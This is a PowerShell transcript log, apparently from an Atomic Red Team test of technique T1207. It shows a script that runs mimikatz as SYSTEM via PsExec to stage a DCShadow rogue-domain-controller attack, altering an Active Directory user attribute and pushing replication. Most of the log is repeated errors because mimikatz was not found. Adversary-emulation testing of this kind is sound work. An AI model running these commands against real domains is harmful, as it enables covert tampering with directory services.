**********************
Windows PowerShell 脚本开始
开始时间: 20230415180731
用户名: DESKTOP-SP5BHV2\wangjian
RunAs 用户: DESKTOP-SP5BHV2\wangjian
配置名称: 
计算机: DESKTOP-SP5BHV2 (Microsoft Windows NT 10.0.19044.0)
主机应用程序: powershell.exe & {# starting fake DC server, as SYSTEM (required)
$dc_output_file = "$env:TEMP\art-T1207-mimikatz-DC.log"
Remove-Item $dc_output_file -ErrorAction Ignore
$mimikatzParam ="`"log $dc_output_file`" `"lsadump::dcshadow /object:bruce.wayne /attribute:badpwdcount /value:9999`" `"exit`""
$dc = Start-Process -FilePath cmd.exe -Verb Runas -ArgumentList "/c C:\PSTools\PsExec.exe /accepteula -d -s $env:TEMP\mimikatz\x64\mimikatz.exe $mimikatzParam"

# wait for fake DC server to be ready...
Start-Sleep -Seconds 5

# server ready, so trigger replication (push) and wait until it finished
& $env:TEMP\mimikatz\x64\mimikatz.exe "lsadump::dcshadow /push" "exit"

Write-Host "`nWaiting for fake DC server to return"
Wait-Process $dc

Write-Host "`nOutput from fake DC server:"
Get-Content $dc_output_file
Start-Sleep 1 # wait a little until the file is not locked anymore so we can actually delete it
Remove-Item $dc_output_file -ErrorAction Ignore

Write-Host "End of DCShadow"}
进程 ID: 11244
PSVersion: 5.1.19041.2673
PSEdition: Desktop
PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.19041.2673
BuildVersion: 10.0.19041.2673
CLRVersion: 4.0.30319.42000
WSManStackVersion: 3.0
PSRemotingProtocolVersion: 2.3
SerializationVersion: 1.1.0.1
**********************
PS>. 'C:\Users\wangjian\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1'
PS>& {# starting fake DC server, as SYSTEM (required)
$dc_output_file = "$env:TEMP\art-T1207-mimikatz-DC.log"
Remove-Item $dc_output_file -ErrorAction Ignore
$mimikatzParam ="`"log $dc_output_file`" `"lsadump::dcshadow /object:bruce.wayne /attribute:badpwdcount /value:9999`" `"exit`""
$dc = Start-Process -FilePath cmd.exe -Verb Runas -ArgumentList "/c C:\PSTools\PsExec.exe /accepteula -d -s $env:TEMP\mimikatz\x64\mimikatz.exe $mimikatzParam"

# wait for fake DC server to be ready...
Start-Sleep -Seconds 5

# server ready, so trigger replication (push) and wait until it finished
& $env:TEMP\mimikatz\x64\mimikatz.exe "lsadump::dcshadow /push" "exit"

Write-Host "`nWaiting for fake DC server to return"
Wait-Process $dc

Write-Host "`nOutput from fake DC server:"
Get-Content $dc_output_file
Start-Sleep 1 # wait a little until the file is not locked anymore so we can actually delete it
Remove-Item $dc_output_file -ErrorAction Ignore

Write-Host "End of DCShadow"}
**********************
Windows PowerShell 脚本开始
开始时间: 20230415180738
用户名: DESKTOP-SP5BHV2\wangjian
RunAs 用户: DESKTOP-SP5BHV2\wangjian
配置名称: 
计算机: DESKTOP-SP5BHV2 (Microsoft Windows NT 10.0.19044.0)
主机应用程序: powershell.exe & {# starting fake DC server, as SYSTEM (required)
$dc_output_file = "$env:TEMP\art-T1207-mimikatz-DC.log"
Remove-Item $dc_output_file -ErrorAction Ignore
$mimikatzParam ="`"log $dc_output_file`" `"lsadump::dcshadow /object:bruce.wayne /attribute:badpwdcount /value:9999`" `"exit`""
$dc = Start-Process -FilePath cmd.exe -Verb Runas -ArgumentList "/c C:\PSTools\PsExec.exe /accepteula -d -s $env:TEMP\mimikatz\x64\mimikatz.exe $mimikatzParam"

# wait for fake DC server to be ready...
Start-Sleep -Seconds 5

# server ready, so trigger replication (push) and wait until it finished
& $env:TEMP\mimikatz\x64\mimikatz.exe "lsadump::dcshadow /push" "exit"

Write-Host "`nWaiting for fake DC server to return"
Wait-Process $dc

Write-Host "`nOutput from fake DC server:"
Get-Content $dc_output_file
Start-Sleep 1 # wait a little until the file is not locked anymore so we can actually delete it
Remove-Item $dc_output_file -ErrorAction Ignore

Write-Host "End of DCShadow"}
进程 ID: 11244
PSVersion: 5.1.19041.2673
PSEdition: Desktop
PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.19041.2673
BuildVersion: 10.0.19041.2673
CLRVersion: 4.0.30319.42000
WSManStackVersion: 3.0
PSRemotingProtocolVersion: 2.3
SerializationVersion: 1.1.0.1
**********************
PS>CommandInvocation(Out-String):“Out-String”
>> ParameterBinding(Out-String): 名称 =“InputObject”；值 =“无法将“C:\Users\wangjian\AppData\Local\Temp\mimikatz\x64\mimikatz.exe”项识别为 cmdlet、函数、脚本文件或可运行程序的名称。请检查名称的拼写，如果包括路径，请确保路径正确，然后再试一次。”
& : 无法将“C:\Users\wangjian\AppData\Local\Temp\mimikatz\x64\mimikatz.exe”项识别为 cmdlet、函数、脚本文件或可运行程序的名称。请检查名称的拼写，如果包括路径，请确保路
径正确，然后再试一次。
所在位置 行:11 字符: 3
+ & $env:TEMP\mimikatz\x64\mimikatz.exe "lsadump::dcshadow /push" "exit ...
+   ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (C:\Users\wangji...64\mimikatz.exe:String) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException
& : 无法将“C:\Users\wangjian\AppData\Local\Temp\mimikatz\x64\mimikatz.exe”项识别为 cmdlet、函数、脚本文件或可运行程序的名称。请检查名称的拼写，如果包括路径，请确保路
径正确，然后再试一次。
所在位置 行:11 字符: 3
+ & $env:TEMP\mimikatz\x64\mimikatz.exe "lsadump::dcshadow /push" "exit ...
+   ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (C:\Users\wangji...64\mimikatz.exe:String) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException
& : 无法将“C:\Users\wangjian\AppData\Local\Temp\mimikatz\x64\mimikatz.exe”项识别为 cmdlet、函数、脚本文件或可运行程序的名
称。请检查名称的拼写，如果包括路径，请确保路径正确，然后再试一次。
所在位置 行:11 字符: 3
+ & $env:TEMP\mimikatz\x64\mimikatz.exe "lsadump::dcshadow /push" "exit ...
+   ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (C:\Users\wangji...64\mimikatz.exe:String) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException


Waiting for fake DC server to return
PS>TerminatingError(Wait-Process):“无法将参数绑定到参数“Name”，因为该参数是空值。”
**********************
Windows PowerShell 脚本开始
开始时间: 20230415180738
用户名: DESKTOP-SP5BHV2\wangjian
RunAs 用户: DESKTOP-SP5BHV2\wangjian
配置名称: 
计算机: DESKTOP-SP5BHV2 (Microsoft Windows NT 10.0.19044.0)
主机应用程序: powershell.exe & {# starting fake DC server, as SYSTEM (required)
$dc_output_file = "$env:TEMP\art-T1207-mimikatz-DC.log"
Remove-Item $dc_output_file -ErrorAction Ignore
$mimikatzParam ="`"log $dc_output_file`" `"lsadump::dcshadow /object:bruce.wayne /attribute:badpwdcount /value:9999`" `"exit`""
$dc = Start-Process -FilePath cmd.exe -Verb Runas -ArgumentList "/c C:\PSTools\PsExec.exe /accepteula -d -s $env:TEMP\mimikatz\x64\mimikatz.exe $mimikatzParam"

# wait for fake DC server to be ready...
Start-Sleep -Seconds 5

# server ready, so trigger replication (push) and wait until it finished
& $env:TEMP\mimikatz\x64\mimikatz.exe "lsadump::dcshadow /push" "exit"

Write-Host "`nWaiting for fake DC server to return"
Wait-Process $dc

Write-Host "`nOutput from fake DC server:"
Get-Content $dc_output_file
Start-Sleep 1 # wait a little until the file is not locked anymore so we can actually delete it
Remove-Item $dc_output_file -ErrorAction Ignore

Write-Host "End of DCShadow"}
进程 ID: 11244
PSVersion: 5.1.19041.2673
PSEdition: Desktop
PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.19041.2673
BuildVersion: 10.0.19041.2673
CLRVersion: 4.0.30319.42000
WSManStackVersion: 3.0
PSRemotingProtocolVersion: 2.3
SerializationVersion: 1.1.0.1
**********************
PS>CommandInvocation(Out-String):“Out-String”
>> ParameterBinding(Out-String): 名称 =“InputObject”；值 =“无法将参数绑定到参数“Name”，因为该参数是空值。”
Wait-Process : 无法将参数绑定到参数“Name”，因为该参数是空值。
所在位置 行:14 字符: 14
+ Wait-Process $dc
+              ~~~
    + CategoryInfo          : InvalidData: (:) [Wait-Process]，ParameterBindingValidationException
    + FullyQualifiedErrorId : ParameterArgumentValidationErrorNullNotAllowed,Microsoft.PowerShell.Commands.WaitProcessCo
mmand
Wait-Process : 无法将参数绑定到参数“Name”，因为该参数是空值。
所在位置 行:14 字符: 14
+ Wait-Process $dc
+              ~~~
    + CategoryInfo          : InvalidData: (:) [Wait-Process]，ParameterBindingValidationException
    + FullyQualifiedErrorId : ParameterArgumentValidationErrorNullNotAllowed,Microsoft.PowerShell.Commands.WaitProcessCo
mmand
Wait-Process : 无法将参数绑定到参数“Name”，因为该参数是空值。
所在位置 行:14 字符: 14
+ Wait-Process $dc
+              ~~~
    + CategoryInfo          : InvalidData: (:) [Wait-Process]，ParameterBindingValidationException
    + FullyQualifiedErrorId : ParameterArgumentValidationErrorNullNotAllowed,Microsoft.PowerShell.Commands.WaitProcess
   Command


Output from fake DC server:
**********************
Windows PowerShell 脚本开始
开始时间: 20230415180738
用户名: DESKTOP-SP5BHV2\wangjian
RunAs 用户: DESKTOP-SP5BHV2\wangjian
配置名称: 
计算机: DESKTOP-SP5BHV2 (Microsoft Windows NT 10.0.19044.0)
主机应用程序: powershell.exe & {# starting fake DC server, as SYSTEM (required)
$dc_output_file = "$env:TEMP\art-T1207-mimikatz-DC.log"
Remove-Item $dc_output_file -ErrorAction Ignore
$mimikatzParam ="`"log $dc_output_file`" `"lsadump::dcshadow /object:bruce.wayne /attribute:badpwdcount /value:9999`" `"exit`""
$dc = Start-Process -FilePath cmd.exe -Verb Runas -ArgumentList "/c C:\PSTools\PsExec.exe /accepteula -d -s $env:TEMP\mimikatz\x64\mimikatz.exe $mimikatzParam"

# wait for fake DC server to be ready...
Start-Sleep -Seconds 5

# server ready, so trigger replication (push) and wait until it finished
& $env:TEMP\mimikatz\x64\mimikatz.exe "lsadump::dcshadow /push" "exit"

Write-Host "`nWaiting for fake DC server to return"
Wait-Process $dc

Write-Host "`nOutput from fake DC server:"
Get-Content $dc_output_file
Start-Sleep 1 # wait a little until the file is not locked anymore so we can actually delete it
Remove-Item $dc_output_file -ErrorAction Ignore

Write-Host "End of DCShadow"}
进程 ID: 11244
PSVersion: 5.1.19041.2673
PSEdition: Desktop
PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.19041.2673
BuildVersion: 10.0.19041.2673
CLRVersion: 4.0.30319.42000
WSManStackVersion: 3.0
PSRemotingProtocolVersion: 2.3
SerializationVersion: 1.1.0.1
**********************
PS>CommandInvocation(Out-String):“Out-String”
>> ParameterBinding(Out-String): 名称 =“InputObject”；值 =“找不到路径“C:\Users\wangjian\AppData\Local\Temp\art-T1207-mimikatz-DC.log”，因为该路径不存在。”
Get-Content : 找不到路径“C:\Users\wangjian\AppData\Local\Temp\art-T1207-mimikatz-DC.log”，因为该路径不存在。
所在位置 行:17 字符: 1
+ Get-Content $dc_output_file
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (C:\Users\wangji...mimikatz-DC.log:String) [Get-Content], ItemNotFoundExce
ption
    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetContentCommand
Get-Content : 找不到路径“C:\Users\wangjian\AppData\Local\Temp\art-T1207-mimikatz-DC.log”，因为该路径不存在。
所在位置 行:17 字符: 1
+ Get-Content $dc_output_file
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (C:\Users\wangji...mimikatz-DC.log:String) [Get-Content], ItemNotFoundExce
ption
    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetContentCommand
Get-Content : 找不到路径“C:\Users\wangjian\AppData\Local\Temp\art-T1207-mimikatz-DC.log”，因为该路径不存在。
所在位置 行:17 字符: 1
+ Get-Content $dc_output_file
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (C:\Users\wangji...mimikatz-DC.log:String) [Get-Content], ItemNotFoundEx
   ception
    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetContentCommand

End of DCShadow
PS>$global:?
True
**********************
Windows PowerShell 脚本结束
结束时间: 20230415180739
**********************
